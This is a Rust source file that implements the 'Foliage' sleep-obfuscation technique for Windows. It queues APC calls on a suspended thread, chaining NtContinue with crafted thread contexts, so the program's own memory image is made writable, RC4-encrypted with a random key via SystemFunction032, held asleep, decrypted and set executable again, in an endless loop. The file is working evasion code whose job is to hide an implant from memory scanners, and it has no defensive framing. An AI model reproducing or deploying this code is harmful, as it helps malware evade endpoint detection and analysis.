#![allow(non_snake_case)]
use std::{os::raw::c_void, ptr::null_mut};

use ntapi::{ntexapi::NtCreateEvent, ntobapi::NtSignalAndWaitForSingleObject};
use windows_sys::Win32::{
    Foundation::{CloseHandle, NTSTATUS},
    System::{
        Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64, IMAGE_NT_HEADERS64},
        Kernel::SynchronizationEvent,
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Memory::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
        SystemServices::IMAGE_DOS_HEADER,
        Threading::{EVENT_ALL_ACCESS, GetCurrentProcess, THREAD_ALL_ACCESS},
    },
};

unsafe extern "system" {
    fn NtCreateThreadEx(
        ThreadHandle: *mut *mut c_void,
        DesiredAccess: u32,
        ObjectAttributes: *mut c_void,
        ProcessHandle: *mut c_void,
        StartRoutine: *mut c_void,
        Argument: *mut c_void,
        CreateFlags: u32,
        ZeroBits: usize,
        StackSize: usize,
        MaximumStackSize: usize,
        AttributeList: *mut c_void,
    ) -> NTSTATUS;
}

#[repr(C)]
struct USTRING {
    len: u32,
    max_len: u32,
    buffer: *mut u8,
}

#[repr(C, align(16))]
#[derive(Clone, Copy)]
struct AlignedContext(CONTEXT);

fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

#[cfg(any(target_arch = "x86_64"))]
fn gen_random() -> u32 {
    unsafe {
        use std::arch::x86_64::_rdrand32_step;

        let mut seed: u32 = 0;
        _rdrand32_step(&mut seed);
        seed
    }
}

fn foliage(sleep_time: u32) {
    unsafe {
        let mut ctx_init = AlignedContext(CONTEXT::default());
        let mut event_sync: *mut c_void = null_mut();
        let mut thread_handle: *mut c_void = null_mut();
        let mut key: [u8; 16] = [0; 16];
        let mut old_protection: u32 = 0;

        let image_base: *mut c_void = GetModuleHandleA(null_mut());
        let dos_header = image_base as *const IMAGE_DOS_HEADER;
        let nt_header =
            image_base.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let image_size = (*nt_header).OptionalHeader.SizeOfImage;

        println!("[+] Image Base: {:p} [{} bytes]", image_base, image_size);

        let kernel32 = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const u8);
        let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);
        let mut advapi32 = GetModuleHandleA("advapi32.dll\0".as_ptr() as *const u8);

        if advapi32.is_null() {
            advapi32 = LoadLibraryA("advapi32.dll\0".as_ptr() as *const u8);
        }

        if kernel32.is_null() || ntdll.is_null() || advapi32.is_null() {
            println!("[-] Failed to load DLLs");
            return;
        }

        let virtual_protect = GetProcAddress(kernel32, "VirtualProtect\0".as_ptr() as *const u8)
            .unwrap() as *mut c_void;
        let wait_for_single_object_ex =
            GetProcAddress(kernel32, "WaitForSingleObjectEx\0".as_ptr() as *const u8).unwrap()
                as *mut c_void;
        let nt_wait_for_single_object =
            GetProcAddress(ntdll, "NtWaitForSingleObject\0".as_ptr() as *const u8).unwrap()
                as *mut c_void;
        let nt_continue =
            GetProcAddress(ntdll, "NtContinue\0".as_ptr() as *const u8).unwrap() as *mut c_void;
        let nt_test_alert =
            GetProcAddress(ntdll, "NtTestAlert\0".as_ptr() as *const u8).unwrap() as *mut c_void;
        let nt_get_context_thread =
            GetProcAddress(ntdll, "NtGetContextThread\0".as_ptr() as *const u8).unwrap()
                as *mut c_void;
        let nt_queue_apc_thread = GetProcAddress(ntdll, "NtQueueApcThread\0".as_ptr() as *const u8)
            .unwrap() as *mut c_void;
        let nt_alert_resume_thread =
            GetProcAddress(ntdll, "NtAlertResumeThread\0".as_ptr() as *const u8).unwrap()
                as *mut c_void;
        let rtl_exit_user_thread =
            GetProcAddress(ntdll, "RtlExitUserThread\0".as_ptr() as *const u8).unwrap()
                as *mut c_void;
        let systemfunction032 =
            GetProcAddress(advapi32, "SystemFunction032\0".as_ptr() as *const u8).unwrap()
                as *mut c_void;

        if virtual_protect.is_null()
            || wait_for_single_object_ex.is_null()
            || nt_wait_for_single_object.is_null()
            || nt_continue.is_null()
            || nt_test_alert.is_null()
            || nt_get_context_thread.is_null()
            || nt_queue_apc_thread.is_null()
            || nt_alert_resume_thread.is_null()
            || rtl_exit_user_thread.is_null()
            || systemfunction032.is_null()
        {
            println!("[-] Failed to resolve functions");
            return;
        }

        type NtGetContextThreadFn =
            unsafe extern "system" fn(*mut c_void, *mut CONTEXT) -> NTSTATUS;
        type NtQueueApcThreadFn = unsafe extern "system" fn(
            *mut c_void,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            *mut c_void,
        ) -> NTSTATUS;
        type NtAlertResumeThreadFn = unsafe extern "system" fn(*mut c_void, *mut u32) -> NTSTATUS;

        let nt_get_context_thread: NtGetContextThreadFn =
            std::mem::transmute(nt_get_context_thread);
        let nt_queue_apc_thread: NtQueueApcThreadFn = std::mem::transmute(nt_queue_apc_thread);
        let nt_alert_resume_thread: NtAlertResumeThreadFn =
            std::mem::transmute(nt_alert_resume_thread);

        for i in 0..16 {
            key[i] = gen_random() as u8;
        }

        let mut key_buffer = USTRING {
            len: 16,
            max_len: 16,
            buffer: key.as_mut_ptr(),
        };

        let mut image = USTRING {
            len: image_size,
            max_len: image_size,
            buffer: image_base as *mut u8,
        };

        if !nt_success(NtCreateEvent(
            &mut event_sync as *mut _ as _,
            EVENT_ALL_ACCESS,
            null_mut(),
            SynchronizationEvent as u32,
            0,
        )) {
            println!("[-] Failed to create event");
            return;
        }

        if !nt_success(NtCreateThreadEx(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            null_mut(),
            GetCurrentProcess(),
            rtl_exit_user_thread,
            null_mut(),
            1,
            0,
            0x1000 * 20,
            0x1000 * 20,
            null_mut(),
        )) {
            println!("[-] Failed to create thread");
            return;
        }

        println!("[+] Thread Handle: {:p}", thread_handle);

        ctx_init.0.ContextFlags = CONTEXT_FULL_AMD64;
        if !nt_success(nt_get_context_thread(
            thread_handle,
            &mut ctx_init.0 as *mut CONTEXT,
        )) {
            println!("[-] Failed to get thread context");
            return;
        }

        *(ctx_init.0.Rsp as *mut u64) = nt_test_alert as u64;

        let mut ctx: [AlignedContext; 7] = [ctx_init; 7];

        // NtWaitForSingleObject(event_sync, FALSE, NULL)
        ctx[0].0.Rip = nt_wait_for_single_object as u64;
        ctx[0].0.Rcx = event_sync as u64;
        ctx[0].0.Rdx = 0;
        ctx[0].0.R8 = 0;

        // VirtualProtect(image_base, image_size, PAGE_READWRITE, &old_protection)
        ctx[1].0.Rip = virtual_protect as u64;
        ctx[1].0.Rcx = image_base as u64;
        ctx[1].0.Rdx = image_size as u64;
        ctx[1].0.R8 = PAGE_READWRITE as u64;
        ctx[1].0.R9 = &mut old_protection as *mut u32 as u64;

        // SystemFunction032(&image, &key)
        ctx[2].0.Rip = systemfunction032 as u64;
        ctx[2].0.Rcx = &mut image as *mut USTRING as u64;
        ctx[2].0.Rdx = &mut key_buffer as *mut USTRING as u64;

        // WaitForSingleObjectEx(GetCurrentProcess(), sleep_time, FALSE)
        ctx[3].0.Rip = wait_for_single_object_ex as u64;
        ctx[3].0.Rcx = GetCurrentProcess() as u64;
        ctx[3].0.Rdx = sleep_time as u64;
        ctx[3].0.R8 = 0;

        // SystemFunction032(&image, &key)
        ctx[4].0.Rip = systemfunction032 as u64;
        ctx[4].0.Rcx = &mut image as *mut USTRING as u64;
        ctx[4].0.Rdx = &mut key_buffer as *mut USTRING as u64;

        // VirtualProtect(image_base, image_size, PAGE_EXECUTE_READWRITE, &old_protection)
        ctx[5].0.Rip = virtual_protect as u64;
        ctx[5].0.Rcx = image_base as u64;
        ctx[5].0.Rdx = image_size as u64;
        ctx[5].0.R8 = PAGE_EXECUTE_READWRITE as u64;
        ctx[5].0.R9 = &mut old_protection as *mut u32 as u64;

        // RtlExitUserThread(0)
        ctx[6].0.Rip = rtl_exit_user_thread as u64;
        ctx[6].0.Rcx = 0;

        println!("[+] Sleeping for {} milliseconds...", sleep_time);

        for i in 0..7 {
            if !nt_success(nt_queue_apc_thread(
                thread_handle,
                nt_continue,
                &mut ctx[i] as *mut AlignedContext as *mut c_void,
                null_mut(),
                null_mut(),
            )) {
                println!("[-] Failed to queue APC for context {}", i);
                return;
            }
        }

        if !nt_success(nt_alert_resume_thread(thread_handle, null_mut())) {
            println!("[-] Failed to alert-resume thread");
            return;
        }

        if !nt_success(NtSignalAndWaitForSingleObject(
            event_sync as *mut _,
            thread_handle as *mut _,
            0,
            null_mut(),
        )) {
            println!("[-] Failed to signal and wait for single object");
            return;
        }

        println!("[+] Woke Up....");
        println!();

        if thread_handle != null_mut() {
            CloseHandle(thread_handle);
        }
        if event_sync != null_mut() {
            CloseHandle(event_sync);
        }
    }
}

fn main() {
    loop {
        foliage(3000);
    }
}
